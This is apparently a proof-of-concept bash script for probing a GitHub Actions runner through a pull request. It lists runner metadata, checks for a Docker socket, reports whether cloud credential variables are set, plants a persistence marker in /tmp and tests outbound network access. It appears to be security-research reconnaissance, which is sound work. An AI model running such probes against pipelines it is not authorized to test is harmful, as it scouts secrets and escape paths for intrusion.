#!/usr/bin/env bash
set -euo pipefail

echo "=== poc:start ==="
echo "repo=${GITHUB_REPOSITORY:-unknown}"
echo "event=${GITHUB_EVENT_NAME:-unknown}"
echo "run_id=${GITHUB_RUN_ID:-unknown}"
echo "runner_name=${RUNNER_NAME:-unknown}"
echo "runner_os=${RUNNER_OS:-unknown}"
echo "runner_arch=${RUNNER_ARCH:-unknown}"
echo "hostname=$(hostname)"
echo "uid_gid=$(id -u):$(id -g)"

[[ -S /var/run/docker.sock ]] && echo "docker_sock=present" || echo "docker_sock=absent"
[[ -d /home/runner/work ]] && echo "workspace_dir=present" || echo "workspace_dir=absent"

for v in GOOGLE_APPLICATION_CREDENTIALS AWS_ACCESS_KEY_ID AZURE_TENANT_ID; do
  [[ -n "${!v:-}" ]] && echo "env_${v}=set" || echo "env_${v}=unset"
done

MARKER="/tmp/distroless_pr_poc_marker"
if [[ -f "$MARKER" ]]; then
  echo "persistence_marker=present"
  head -n1 "$MARKER" || true
else
  echo "persistence_marker=absent_creating"
  date -Is > "$MARKER"
fi

code="$(curl -m 3 -s -o /dev/null -w '%{http_code}' https://example.com || true)"
echo "egress_https_status=${code}"

echo "=== poc:end ==="
